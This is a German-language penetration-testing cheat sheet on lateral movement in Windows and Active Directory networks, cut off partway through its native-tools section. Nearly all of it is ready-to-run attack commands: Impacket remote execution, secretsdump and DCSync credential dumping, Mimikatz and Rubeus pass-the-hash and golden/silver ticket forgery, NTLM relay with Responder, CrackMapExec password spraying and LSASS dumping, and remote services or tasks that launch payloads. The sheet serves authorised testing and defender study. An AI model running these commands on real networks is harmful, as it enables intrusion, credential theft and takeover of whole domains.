# Lateral Movement Methoden - Autorisierter Pentest Cheat Sheet

**Warnung**: Diese Methoden sind NUR für autorisierte Penetrationstests, CTF-Challenges, Sicherheitsforschung und forensische Analysen auf eigenen/genehmigten Systemen.

**Kontext**: Lateral Movement beschreibt Techniken, um sich nach initialer Kompromittierung zwischen Systemen in einem Netzwerk zu bewegen.

---

## Inhaltsverzeichnis
1. [Impacket Suite (von Linux/Kali)](#impacket-suite-von-linuxkali)
2. [PsExec & Varianten](#psexec-varianten)
3. [WMI (Windows Management Instrumentation)](#wmi-windows-management-instrumentation)
4. [WinRM (Windows Remote Management)](#winrm-windows-remote-management)
5. [RDP (Remote Desktop Protocol)](#rdp-remote-desktop-protocol)
6. [SMB & Named Pipes](#smb-named-pipes)
7. [DCOM (Distributed COM)](#dcom-distributed-com)
8. [Scheduled Tasks (Remote)](#scheduled-tasks-remote)
9. [Windows Services (Remote)](#windows-services-remote)
10. [PowerShell Remoting](#powershell-remoting)
11. [Pass-the-Hash (PtH)](#pass-the-hash-pth)
12. [Pass-the-Ticket (PtT)](#pass-the-ticket-ptt)
13. [Overpass-the-Hash](#overpass-the-hash)
14. [Silver Ticket & Golden Ticket](#silver-ticket-golden-ticket)
15. [Token Impersonation](#token-impersonation)
16. [NTLM Relay](#ntlm-relay)
17. [Kerberos Delegation Abuse](#kerberos-delegation-abuse)
18. [RPC & MSRPC](#rpc-msrpc)
19. [SSH (Linux/Unix)](#ssh-linuxunix)
20. [CrackMapExec (CME)](#crackmapexec-cme)
21. [Native Windows Tools](#native-windows-tools)
22. [Red Team Frameworks](#red-team-frameworks)
23. [Living Off The Land](#living-off-the-land)
24. [Covert Channels](#covert-channels)

---

## Impacket Suite (von Linux/Kali)

**Beschreibung**: Python-basierte Tools für Windows-Protokolle (SMB, MSRPC, etc.)

### 1. psexec.py
**Beschreibung**: Remote Command Execution via SMB + Service Creation
```bash
# Mit Credentials
psexec.py domain/user:password@192.168.1.10

# Mit NTLM Hash (Pass-the-Hash)
psexec.py domain/user@192.168.1.10 -hashes :ntlmhash

# Mit LM + NTLM Hash
psexec.py domain/user@192.168.1.10 -hashes lmhash:ntlmhash

# Lokaler Admin ohne Domain
psexec.py ./administrator:password@192.168.1.10

# Custom Command ausführen
psexec.py domain/user:password@192.168.1.10 "whoami"

# Interactive Shell
psexec.py domain/user:password@192.168.1.10
```
**Mechanismus**: Erstellt Service über SMB, führt Command aus
**Port**: TCP 445 (SMB)
**Rechte**: Lokaler Administrator

### 2. smbexec.py
**Beschreibung**: Stealthier als psexec - kein Service Binary Upload
```bash
# Mit Credentials
smbexec.py domain/user:password@192.168.1.10

# Mit Hash
smbexec.py domain/user@192.168.1.10 -hashes :ntlmhash

# Share-Modus (legt Output in Share ab)
smbexec.py domain/user:password@192.168.1.10 -share ADMIN$

# Mode: Share vs CMD
smbexec.py domain/user:password@192.168.1.10 -mode share
```
**Mechanismus**: Nutzt Service + Echo für Command Execution, kein Binary Upload
**Vorteil**: Weniger Artefakte auf Disk
**Port**: TCP 445

### 3. wmiexec.py
**Beschreibung**: Command Execution via WMI
```bash
# Standard
wmiexec.py domain/user:password@192.168.1.10

# Mit Hash
wmiexec.py domain/user@192.168.1.10 -hashes :ntlmhash

# Kerberos Authentifizierung
wmiexec.py domain/user@192.168.1.10 -k -no-pass

# Custom Command
wmiexec.py domain/user:password@192.168.1.10 "whoami"

# Ohne Output via RPC (stealthier)
wmiexec.py domain/user:password@192.168.1.10 -nooutput
```
**Mechanismus**: WMI Win32_Process Create
**Port**: TCP 135 (RPC), Dynamic Ports 49152-65535
**Vorteil**: Kein SMB File Upload, weniger Logs

### 4. dcomexec.py
**Beschreibung**: Command Execution via DCOM (MMC20.Application)
```bash
# Standard DCOM
dcomexec.py domain/user:password@192.168.1.10

# Mit Hash
dcomexec.py domain/user@192.168.1.10 -hashes :ntlmhash

# Spezifisches DCOM Object
dcomexec.py domain/user:password@192.168.1.10 -object MMC20

# Alternativen: ShellWindows, ShellBrowserWindow
dcomexec.py domain/user:password@192.168.1.10 -object ShellWindows
```
**DCOM Objects**: MMC20.Application, ShellWindows, ShellBrowserWindow
**Port**: TCP 135, Dynamic RPC Ports
**Vorteil**: Alternative wenn WMI blockiert

### 5. atexec.py
**Beschreibung**: Command Execution via Task Scheduler
```bash
# Standard
atexec.py domain/user:password@192.168.1.10 "whoami"

# Mit Hash
atexec.py domain/user@192.168.1.10 -hashes :ntlmhash "ipconfig"

# Kerberos
atexec.py domain/user@target.domain.local -k -no-pass "whoami"
```
**Mechanismus**: Scheduled Task über ATSVC (Legacy Task Scheduler RPC)
**Port**: TCP 445
**Hinweis**: Legacy, aber funktional

### 6. secretsdump.py
**Beschreibung**: Credential Dumping für weiteren Lateral Movement
```bash
# SAM Dump (lokale Hashes)
secretsdump.py domain/user:password@192.168.1.10

# Mit Hash
secretsdump.py domain/user@192.168.1.10 -hashes :ntlmhash

# Nur NTDS.dit (DC)
secretsdump.py domain/user:password@dc.domain.local -just-dc

# DCSync (Domain Replication)
secretsdump.py domain/user:password@dc.domain.local -just-dc-ntlm

# Nur User (ohne Computer$)
secretsdump.py domain/user:password@dc.domain.local -just-dc-user

# Output in Datei
secretsdump.py domain/user:password@192.168.1.10 -outputfile hashes
```
**Use Case**: Credentials für weitere Lateral Movement extrahieren

### 7. GetUserSPNs.py
**Beschreibung**: Kerberoasting für Service Account Credentials
```bash
# Kerberoastable Accounts finden
GetUserSPNs.py domain/user:password -dc-ip 192.168.1.5

# TGS Requests (Hashes)
GetUserSPNs.py domain/user:password -dc-ip 192.168.1.5 -request

# Hashcat Format
GetUserSPNs.py domain/user:password -dc-ip 192.168.1.5 -request -outputfile hashes.txt

# Mit Hash
GetUserSPNs.py domain/user -hashes :ntlmhash -dc-ip 192.168.1.5 -request
```
**Port**: TCP 88 (Kerberos)
**Use Case**: Service Account Credentials cracken → Lateral Movement

### 8. GetNPUsers.py
**Beschreibung**: AS-REP Roasting (Accounts ohne Kerberos Pre-Auth)
```bash
# Alle AS-REP Roastable Users
GetNPUsers.py domain/ -dc-ip 192.168.1.5 -usersfile users.txt -format hashcat

# Spezifischer User
GetNPUsers.py domain/user -dc-ip 192.168.1.5 -no-pass

# Output
GetNPUsers.py domain/ -dc-ip 192.168.1.5 -usersfile users.txt -outputfile hashes.txt
```

### 9. getTGT.py
**Beschreibung**: TGT Request für Pass-the-Ticket
```bash
# TGT mit Credentials
getTGT.py domain/user:password

# TGT mit Hash
getTGT.py domain/user -hashes :ntlmhash

# TGT mit AES Key
getTGT.py domain/user -aesKey <aes256key>

# Output: user.ccache
export KRB5CCNAME=user.ccache
psexec.py domain/user@target.domain.local -k -no-pass
```

### 10. getST.py
**Beschreibung**: Service Ticket (TGS) Request
```bash
# TGS Request mit TGT
getST.py domain/user -spn cifs/target.domain.local -impersonate Administrator

# Mit Kerberos Delegation
getST.py domain/user:password -spn cifs/target.domain.local -impersonate Administrator -dc-ip 192.168.1.5

# Use Ticket
export KRB5CCNAME=Administrator.ccache
psexec.py domain/Administrator@target.domain.local -k -no-pass
```

### 11. ticketer.py
**Beschreibung**: Golden/Silver Ticket Creation
```bash
# Golden Ticket (TGT Forge)
ticketer.py -nthash <krbtgt_ntlm> -domain-sid S-1-5-21-... -domain domain.local Administrator

# Silver Ticket (TGS Forge)
ticketer.py -nthash <service_ntlm> -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target.domain.local Administrator

# Use Ticket
export KRB5CCNAME=Administrator.ccache
psexec.py domain/Administrator@target.domain.local -k -no-pass
```

### 12. reg.py
**Beschreibung**: Remote Registry Access
```bash
# Query Remote Registry
reg.py domain/user:password@192.168.1.10 query -keyName HKLM\\Software

# Save Hive
reg.py domain/user:password@192.168.1.10 save -keyName HKLM\\SAM

# Backup
reg.py domain/user:password@192.168.1.10 backup -o output
```

---

## PsExec & Varianten

### 13. PsExec (Sysinternals)
**Beschreibung**: Original Microsoft Tool
```cmd
# Von Windows aus
psexec.exe \\192.168.1.10 -u domain\user -p password cmd

# Interactive Shell
psexec.exe \\192.168.1.10 -u domain\user -p password -i cmd

# Als SYSTEM
psexec.exe \\192.168.1.10 -u domain\user -p password -s cmd

# Command ausführen
psexec.exe \\192.168.1.10 -u domain\user -p password ipconfig

# Auf mehreren Hosts
psexec.exe \\192.168.1.10,192.168.1.11 -u domain\user -p password cmd

# Accept EULA automatisch
psexec.exe \\192.168.1.10 -u domain\user -p password -accepteula cmd
```
**Port**: TCP 445
**Mechanismus**: ADMIN$ Share + Service Creation

### 14. PsExec64 (64-bit)
```cmd
psexec64.exe \\target -u user -p pass cmd
```

### 15. PAExec (Alternative)
```cmd
# PAExec (PsExec Alternative)
paexec.exe \\192.168.1.10 -u domain\user -p password cmd
```

---

## WMI (Windows Management Instrumentation)

### 16. wmic (Native Windows)
```cmd
# Remote Command Execution
wmic /node:192.168.1.10 /user:domain\user /password:password process call create "cmd.exe /c whoami > C:\output.txt"

# Mit Credentials
wmic /node:192.168.1.10 /user:domain\user /password:password process call create "calc.exe"

# Multiple Hosts
wmic /node:@targets.txt /user:domain\user /password:password process call create "cmd.exe"

# Process Info
wmic /node:192.168.1.10 /user:domain\user /password:password process list brief
```
**Port**: TCP 135, Dynamic RPC
**Hinweis**: Kein interaktiver Shell

### 17. Invoke-WmiMethod (PowerShell)
```powershell
# Remote Command via WMI
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName 192.168.1.10 -Credential $cred

# Ohne Credential Prompt
$user = "domain\user"
$pass = ConvertTo-SecureString "password" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user, $pass)
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe" -ComputerName 192.168.1.10 -Credential $cred

# Mit Current User (wenn Domain Admin)
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "calc.exe" -ComputerName 192.168.1.10
```

### 18. Get-WmiObject (PowerShell)
```powershell
# Remote Process List
Get-WmiObject -Class Win32_Process -ComputerName 192.168.1.10 -Credential $cred

# Remote Service
Get-WmiObject -Class Win32_Service -ComputerName 192.168.1.10 -Credential $cred

# Remote User
Get-WmiObject -Class Win32_UserAccount -ComputerName 192.168.1.10
```

### 19. SharpWMI (C#)
```cmd
# Remote Command Execution
SharpWMI.exe action=exec computername=192.168.1.10 username=domain\user password=password command="cmd.exe /c whoami"
```

---

## WinRM (Windows Remote Management)

### 20. evil-winrm (Linux/Kali)
```bash
# Standard Connection
evil-winrm -i 192.168.1.10 -u user -p password

# Domain User
evil-winrm -i 192.168.1.10 -u 'domain\user' -p password

# Mit Hash (Pass-the-Hash)
evil-winrm -i 192.168.1.10 -u user -H ntlmhash

# SSL/TLS
evil-winrm -i 192.168.1.10 -u user -p password -S

# Upload/Download Files
evil-winrm -i 192.168.1.10 -u user -p password
*Evil-WinRM* PS C:\> upload local.exe C:\temp\remote.exe
*Evil-WinRM* PS C:\> download C:\file.txt

# PowerShell Scripts ausführen
*Evil-WinRM* PS C:\> Invoke-Mimikatz.ps1
```
**Port**: TCP 5985 (HTTP), 5986 (HTTPS)
**Voraussetzung**: User muss in "Remote Management Users" Gruppe sein

### 21. Enter-PSSession (PowerShell - von Windows)
```powershell
# Interactive Session
$cred = Get-Credential
Enter-PSSession -ComputerName 192.168.1.10 -Credential $cred

# Without Credential Prompt
$user = "domain\user"
$pass = ConvertTo-SecureString "password" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user, $pass)
Enter-PSSession -ComputerName 192.168.1.10 -Credential $cred

# SSL
Enter-PSSession -ComputerName 192.168.1.10 -UseSSL -Credential $cred

# Exit Session
Exit-PSSession
```

### 22. Invoke-Command (PowerShell)
```powershell
# Single Command
Invoke-Command -ComputerName 192.168.1.10 -Credential $cred -ScriptBlock { whoami }

# Multiple Hosts
Invoke-Command -ComputerName 192.168.1.10,192.168.1.11,192.168.1.12 -Credential $cred -ScriptBlock { Get-Process }

# Script ausführen
Invoke-Command -ComputerName 192.168.1.10 -Credential $cred -FilePath C:\script.ps1

# Als Job (Background)
Invoke-Command -ComputerName 192.168.1.10 -Credential $cred -ScriptBlock { Start-Sleep 60 } -AsJob

# Mit Pass-the-Hash (benötigt Mimikatz oder Rubeus)
# Erst: sekurlsa::pth /user:admin /domain:contoso /ntlm:hash /run:powershell
Invoke-Command -ComputerName 192.168.1.10 -ScriptBlock { whoami }
```

### 23. New-PSSession (Persistent)
```powershell
# Session erstellen
$session = New-PSSession -ComputerName 192.168.1.10 -Credential $cred

# Session nutzen
Invoke-Command -Session $session -ScriptBlock { whoami }

# Session betreten
Enter-PSSession -Session $session

# Multiple Commands
Invoke-Command -Session $session -ScriptBlock { $var = "test" }
Invoke-Command -Session $session -ScriptBlock { Write-Host $var }

# Session beenden
Remove-PSSession -Session $session
```

### 24. winrs (Native Windows)
```cmd
# Remote Command
winrs -r:192.168.1.10 -u:domain\user -p:password whoami

# Interactive Shell
winrs -r:192.168.1.10 -u:domain\user -p:password cmd

# Environment Variables
winrs -r:192.168.1.10 -u:domain\user -p:password "set"
```

---

## RDP (Remote Desktop Protocol)

### 25. xfreerdp (Linux/Kali)
```bash
# Standard RDP
xfreerdp /u:user /p:password /v:192.168.1.10

# Domain User
xfreerdp /u:domain\\user /p:password /v:192.168.1.10

# Full Screen
xfreerdp /u:user /p:password /v:192.168.1.10 /f

# Custom Resolution
xfreerdp /u:user /p:password /v:192.168.1.10 /size:1920x1080

# Drive Share (Local→Remote)
xfreerdp /u:user /p:password /v:192.168.1.10 /drive:share,/tmp

# Clipboard
xfreerdp /u:user /p:password /v:192.168.1.10 +clipboard

# Network Level Authentication (NLA)
xfreerdp /u:user /p:password /v:192.168.1.10 /sec:nla

# Pass-the-Hash (NLA disabled)
xfreerdp /u:user /pth:ntlmhash /v:192.168.1.10

# Custom Port
xfreerdp /u:user /p:password /v:192.168.1.10:3390

# Ignore Certificate
xfreerdp /u:user /p:password /v:192.168.1.10 /cert:ignore
```
**Port**: TCP 3389
**Hinweis**: User muss in "Remote Desktop Users" sein

### 26. rdesktop (Linux - veraltet)
```bash
# Standard
rdesktop -u user -p password 192.168.1.10

# Domain
rdesktop -d domain -u user -p password 192.168.1.10

# Full Screen
rdesktop -u user -p password -f 192.168.1.10
```

### 27. mstsc (Windows Native)
```cmd
# GUI RDP Client
mstsc /v:192.168.1.10

# Mit Credentials (RDP File)
# Erstelle: connection.rdp
mstsc connection.rdp
```

### 28. SharpRDP (C# - RDP Automation)
```cmd
# Command Execution via RDP
SharpRDP.exe computername=192.168.1.10 username=user password=password command="cmd.exe /c whoami"

# Executable ausführen
SharpRDP.exe computername=192.168.1.10 username=user password=password command="C:\temp\payload.exe"
```

### 29. RDP Pass-the-Hash (Restricted Admin Mode)
```bash
# Restricted Admin Mode aktivieren (auf Target):
# reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0 /f

# Pass-the-Hash mit xfreerdp
xfreerdp /u:admin /pth:ntlmhash /v:192.168.1.10 /sec:nla
```

---

## SMB & Named Pipes

### 30. net use (Windows Native)
```cmd
# Share verbinden
net use \\192.168.1.10\C$ /user:domain\user password

# ADMIN$ Share
net use \\192.168.1.10\ADMIN$ /user:domain\user password

# Mapping als Drive
net use Z: \\192.168.1.10\C$ /user:domain\user password

# Remote Command via Copy + Execution
net use \\192.168.1.10\ADMIN$ /user:domain\user password
copy payload.exe \\192.168.1.10\ADMIN$\temp\
wmic /node:192.168.1.10 /user:domain\user /password:password process call create "C:\Windows\temp\payload.exe"

# Disconnect
net use \\192.168.1.10\C$ /delete
```

### 31. smbclient (Linux)
```bash
# Connect to Share
smbclient //192.168.1.10/C$ -U domain/user%password

# Interactive
smbclient //192.168.1.10/ADMIN$ -U user

# List Shares
smbclient -L 192.168.1.10 -U user%password

# Execute Command via SMB (kein Command Exec, nur File Access)
# Aber: Upload + Remote Execution kombinieren
```

### 32. CrackMapExec SMB Exec
```bash
# Command via SMB
crackmapexec smb 192.168.1.10 -u user -p password -x "whoami"

# PowerShell Command
crackmapexec smb 192.168.1.10 -u user -p password -X "Get-Process"

# Mit Hash
crackmapexec smb 192.168.1.10 -u user -H ntlmhash -x "whoami"
```

---

## DCOM (Distributed COM)

### 33. Invoke-DCOM (PowerShell)
```powershell
# MMC20.Application (DCOM Exec)
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.1.10"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")

# ShellWindows DCOM
$com = [Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","192.168.1.10")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","","open",0)
```

### 34. impacket dcomexec.py (bereits erwähnt #4)
```bash
dcomexec.py domain/user:password@192.168.1.10
```

### 35. SharpDCOM (C#)
```cmd
SharpDCOM.exe target=192.168.1.10 username=user password=password command="calc.exe"
```

---

## Scheduled Tasks (Remote)

### 36. schtasks (Windows Native)
```cmd
# Remote Task erstellen
schtasks /create /tn "TaskName" /tr "C:\payload.exe" /sc once /st 00:00 /S 192.168.1.10 /U domain\user /P password

# Task sofort ausführen
schtasks /run /tn "TaskName" /S 192.168.1.10 /U domain\user /P password

# Task Status
schtasks /query /S 192.168.1.10 /U domain\user /P password /tn "TaskName"

# Task löschen
schtasks /delete /tn "TaskName" /S 192.168.1.10 /U domain\user /P password /f

# Trigger: ONSTART, ONLOGON, etc.
schtasks /create /tn "Persist" /tr "C:\payload.exe" /sc onstart /S 192.168.1.10 /U domain\user /P password
```
**Port**: TCP 445 (SMB für Task Scheduler RPC)

### 37. Register-ScheduledTask (PowerShell Remote)
```powershell
# Remote Task via PowerShell Remoting
Invoke-Command -ComputerName 192.168.1.10 -Credential $cred -ScriptBlock {
    $action = New-ScheduledTaskAction -Execute "calc.exe"
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
    Register-ScheduledTask -TaskName "RemoteTask" -Action $action -Trigger $trigger
}
```

### 38. impacket atexec.py (bereits erwähnt #5)
```bash
atexec.py domain/user:password@192.168.1.10 "whoami"
```

---

## Windows Services (Remote)

### 39. sc (Windows Native)
```cmd
# Remote Service erstellen
sc \\192.168.1.10 create ServiceName binPath= "C:\payload.exe"

# Service starten
sc \\192.168.1.10 start ServiceName

# Service stoppen
sc \\192.168.1.10 stop ServiceName

# Service löschen
sc \\192.168.1.10 delete ServiceName

# Mit Credentials (komplexer, benötigt net use)
net use \\192.168.1.10 /user:domain\user password
sc \\192.168.1.10 create ServiceName binPath= "cmd.exe /c whoami > C:\output.txt"
sc \\192.168.1.10 start ServiceName
```
**Port**: TCP 445

### 40. New-Service (PowerShell Remote)
```powershell
Invoke-Command -ComputerName 192.168.1.10 -Credential $cred -ScriptBlock {
    New-Service -Name "RemoteService" -BinaryPathName "C:\payload.exe" -StartupType Automatic
    Start-Service -Name "RemoteService"
}
```

---

## PowerShell Remoting

### 41. PowerShell Remoting aktivieren
```powershell
# Auf Target (erfordert Admin):
Enable-PSRemoting -Force

# Firewall Rule
netsh advfirewall firewall add rule name="WinRM-HTTP" dir=in localport=5985 protocol=TCP action=allow

# TrustedHosts (wenn kein Domain)
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "192.168.1.10" -Force
```

### 42. Invoke-Command über C2 (Cobalt Strike Style)
```powershell
# Lateral Movement via PowerShell Remoting
$session = New-PSSession -ComputerName 192.168.1.10 -Credential $cred
Invoke-Command -Session $session -FilePath C:\beacon.ps1
```

---

## Pass-the-Hash (PtH)

### 43. Mimikatz Pass-the-Hash
```cmd
# Von Attacker Windows-Maschine
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:admin /domain:contoso /ntlm:NTLMHASH /run:cmd.exe" exit

# In neuer CMD mit Admin Hash:
psexec.exe \\192.168.1.10 cmd
```

### 44. Impacket Pass-the-Hash (bereits in #1-12 gezeigt)
```bash
# Alle Impacket Tools unterstützen -hashes
psexec.py domain/user@192.168.1.10 -hashes :ntlmhash
wmiexec.py domain/user@192.168.1.10 -hashes :ntlmhash
smbexec.py domain/user@192.168.1.10 -hashes :ntlmhash
```

### 45. evil-winrm Pass-the-Hash
```bash
evil-winrm -i 192.168.1.10 -u admin -H ntlmhash
```

### 46. xfreerdp Pass-the-Hash
```bash
xfreerdp /u:admin /pth:ntlmhash /v:192.168.1.10
```

### 47. CrackMapExec Pass-the-Hash
```bash
crackmapexec smb 192.168.1.10 -u admin -H ntlmhash -x "whoami"
```

### 48. Invoke-TheHash (PowerShell)
```powershell
# SMB PtH
Invoke-SMBExec -Target 192.168.1.10 -Username admin -Hash NTLMHASH -Command "calc.exe" -verbose

# WMI PtH
Invoke-WMIExec -Target 192.168.1.10 -Username admin -Hash NTLMHASH -Command "calc.exe"
```

---

## Pass-the-Ticket (PtT)

### 49. Rubeus Pass-the-Ticket
```cmd
# Ticket aus Memory extrahieren
Rubeus.exe dump

# Ticket importieren (Inject)
Rubeus.exe ptt /ticket:base64ticket

# Oder mit .kirbi File
Rubeus.exe ptt /ticket:ticket.kirbi

# Dann: Lateral Movement
dir \\dc.contoso.local\C$
psexec.exe \\dc.contoso.local cmd
```

### 50. Mimikatz Pass-the-Ticket
```cmd
# Ticket exportieren
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit

# Ticket importieren
mimikatz.exe "kerberos::ptt ticket.kirbi" exit

# Lateral Movement
dir \\target.contoso.local\C$
```

### 51. Impacket Kerberos Auth
```bash
# TGT in ccache speichern
export KRB5CCNAME=/path/to/ticket.ccache

# Kerberos Auth mit Impacket
psexec.py domain/user@target.domain.local -k -no-pass
wmiexec.py domain/user@target.domain.local -k -no-pass
smbexec.py domain/user@target.domain.local -k -no-pass
```

---

## Overpass-the-Hash

### 52. Rubeus asktgt
```cmd
# NTLM Hash → TGT
Rubeus.exe asktgt /user:admin /domain:contoso.local /rc4:NTLMHASH

# AES Key → TGT (better OPSEC)
Rubeus.exe asktgt /user:admin /domain:contoso.local /aes256:AESKEY

# Dann: /ptt um Ticket zu importieren
Rubeus.exe asktgt /user:admin /domain:contoso.local /rc4:NTLMHASH /ptt

# Lateral Movement mit Kerberos
dir \\target.contoso.local\C$
```

### 53. Mimikatz Overpass-the-Hash
```cmd
# NTLM → Kerberos TGT
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:admin /domain:contoso.local /ntlm:NTLMHASH /run:powershell.exe" exit

# In neuer PowerShell:
klist
# Generiere Kerberos Ticket durch Zugriff:
dir \\dc.contoso.local\C$
```

---

## Silver Ticket & Golden Ticket

### 54. Golden Ticket (Mimikatz)
```cmd
# Golden Ticket erstellen (mit krbtgt Hash)
mimikatz.exe "kerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-... /krbtgt:KRBTGT_NTLM /id:500 /ptt" exit

# Lateral Movement zu JEDEM Host
dir \\dc.contoso.local\C$
dir \\srv01.contoso.local\C$
psexec.exe \\any-computer cmd
```
**Voraussetzung**: krbtgt NTLM Hash (via DCSync oder NTDS.dit)

### 55. Silver Ticket (Mimikatz)
```cmd
# Silver Ticket für spezifischen Service
mimikatz.exe "kerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-... /target:srv01.contoso.local /service:cifs /rc4:SERVICE_NTLM /ptt" exit

# Zugriff auf spezifischen Service
dir \\srv01.contoso.local\C$
```
**Services**: cifs (SMB), http (IIS), ldap, mssql, host, rpcss

### 56. Impacket ticketer.py (bereits erwähnt #11)
```bash
# Golden Ticket
ticketer.py -nthash KRBTGT_NTLM -domain-sid S-1-5-21-... -domain contoso.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py contoso.local/Administrator@dc.contoso.local -k -no-pass

# Silver Ticket
ticketer.py -nthash SERVICE_NTLM -domain-sid S-1-5-21-... -domain contoso.local -spn cifs/srv01.contoso.local Administrator
```

---

## Token Impersonation

### 57. Incognito (Metasploit)
```ruby
# In Meterpreter
load incognito
list_tokens -u
impersonate_token DOMAIN\\Administrator

# Lateral Movement mit gestohlenen Token
shell
psexec.exe \\target cmd
```

### 58. Invoke-TokenManipulation (PowerShell)
```powershell
# Verfügbare Tokens anzeigen
Invoke-TokenManipulation -ShowAll

# Token stehlen
Invoke-TokenManipulation -ImpersonateUser -Username "DOMAIN\Administrator"

# Process Token stehlen
Invoke-TokenManipulation -CreateProcess "cmd.exe" -ProcessId 1234
```

### 59. SharpToken (C#)
```cmd
# Token Impersonation
SharpToken.exe list
SharpToken.exe impersonate 1234

# Lateral Movement nach Token Theft
```

---

## NTLM Relay

### 60. ntlmrelayx.py (Impacket)
```bash
# SMB→SMB Relay
ntlmrelayx.py -tf targets.txt -smb2support

# SMB→LDAP (für AD Attacks)
ntlmrelayx.py -t ldap://dc.contoso.local -smb2support --escalate-user lowpriv

# SMB→MSSQL
ntlmrelayx.py -t mssql://sql.contoso.local -smb2support --query "SELECT * FROM master.dbo.sysdatabases"

# Mit Socks Proxy für Lateral Movement
ntlmrelayx.py -tf targets.txt -smb2support -socks

# Command Execution nach Relay
ntlmrelayx.py -t 192.168.1.10 -smb2support -c "whoami"
```
**Kombination mit**: Responder, mitm6, ARP Spoofing

### 61. Responder (LLMNR Poisoning)
```bash
# Credentials abfangen
responder -I eth0 -wrf

# Mit ntlmrelayx kombinieren:
# Terminal 1: responder -I eth0 -wrf
# Terminal 2: ntlmrelayx.py -tf targets.txt -smb2support
```

### 62. MultiRelay (Responder Suite)
```bash
# Alternative zu ntlmrelayx
python MultiRelay.py -t 192.168.1.10 -u ALL
```

---

## Kerberos Delegation Abuse

### 63. Unconstrained Delegation
```powershell
# Hosts mit Unconstrained Delegation finden
Get-ADComputer -Filter {TrustedForDelegation -eq $true}
Get-ADUser -Filter {TrustedForDelegation -eq $true}

# Rubeus Monitor (wartet auf Tickets)
Rubeus.exe monitor /interval:5

# Force Authentication (z.B. via printerbug):
# SpoolSample.exe dc.contoso.local attacker-host.contoso.local
# → DC sendet TGT an attacker-host
# → Rubeus fängt DC TGT ab
# → DCSync möglich
```

### 64. Constrained Delegation
```powershell
# Constrained Delegation finden
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo

# S4U2Self + S4U2Proxy mit Rubeus
Rubeus.exe s4u /user:srv01$ /rc4:NTLMHASH /impersonateuser:Administrator /msdsspn:cifs/dc.contoso.local /ptt

# Lateral Movement mit delegiertem Ticket
dir \\dc.contoso.local\C$
```

### 65. Resource-Based Constrained Delegation (RBCD)
```powershell
# RBCD konfigurieren (wenn GenericAll auf Target)
# PowerView:
Set-ADComputer target -PrincipalsAllowedToDelegateToAccount attacker$

# Rubeus S4U
Rubeus.exe s4u /user:attacker$ /rc4:NTLMHASH /impersonateuser:Administrator /msdsspn:cifs/target.contoso.local /ptt

# Lateral Movement
dir \\target.contoso.local\C$
```

---

## RPC & MSRPC

### 66. rpcclient (Linux)
```bash
# Connect
rpcclient -U domain/user%password 192.168.1.10

# Enumeration
enumdomusers
enumdomgroups
queryuser 0x1f4

# Aber: Kein Command Execution direkt
```

### 67. rpcmap.py (Impacket)
```bash
# RPC Endpoints auflisten
rpcmap.py 'ncacn_ip_tcp:192.168.1.10'
```

---

## SSH (Linux/Unix)

### 68. ssh (Standard)
```bash
# Standard SSH
ssh user@192.168.1.10

# Mit Password
sshpass -p 'password' ssh user@192.168.1.10

# Mit Private Key
ssh -i id_rsa user@192.168.1.10

# Custom Port
ssh -p 2222 user@192.168.1.10

# Command Execution
ssh user@192.168.1.10 "whoami"

# ProxyJump (Pivoting)
ssh -J jump-host user@internal-target
```

### 69. SSH Keys (von Linux aus)
```bash
# Public Key auf Target kopieren
ssh-copy-id user@192.168.1.10

# Dann passwordless:
ssh user@192.168.1.10
```

### 70. Metasploit SSH
```ruby
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.0/24
set USERNAME user
set PASSWORD password
run

# Oder mit Key:
set KEY_PATH /path/to/id_rsa
```

---

## CrackMapExec (CME)

### 71. CME SMB Enumeration + Execution
```bash
# Host Discovery
crackmapexec smb 192.168.1.0/24

# Credential Validation
crackmapexec smb 192.168.1.0/24 -u user -p password

# Pass-the-Hash
crackmapexec smb 192.168.1.0/24 -u admin -H ntlmhash

# Command Execution
crackmapexec smb 192.168.1.10 -u admin -p password -x "whoami"

# PowerShell Command
crackmapexec smb 192.168.1.10 -u admin -p password -X "Get-Process"

# Module: Mimikatz
crackmapexec smb 192.168.1.10 -u admin -p password -M mimikatz

# Module: lsassy (LSASS Dump)
crackmapexec smb 192.168.1.10 -u admin -p password -M lsassy

# SAM Dump
crackmapexec smb 192.168.1.10 -u admin -p password --sam

# LSA Secrets
crackmapexec smb 192.168.1.10 -u admin -p password --lsa

# Spray Password gegen Multiple Hosts
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt --continue-on-success
```

### 72. CME WinRM
```bash
# WinRM Execution
crackmapexec winrm 192.168.1.10 -u admin -p password -x "whoami"

# Pass-the-Hash
crackmapexec winrm 192.168.1.10 -u admin -H ntlmhash
```

### 73. CME MSSQL
```bash
# MSSQL Login
crackmapexec mssql 192.168.1.10 -u sa -p password

# Command Execution (xp_cmdshell)
crackmapexec mssql 192.168.1.10 -u sa -p password -x "whoami"
```

### 74. CME SSH
```bash
crackmapexec ssh 192.168.1.10 -u root -p password
```

---

## Native Windows Tools

### 75. Copy + Remote Execution Combo
```cmd
# Methode 1: Copy + wmic
copy payload.exe \\192.168.1.10\C$\temp\
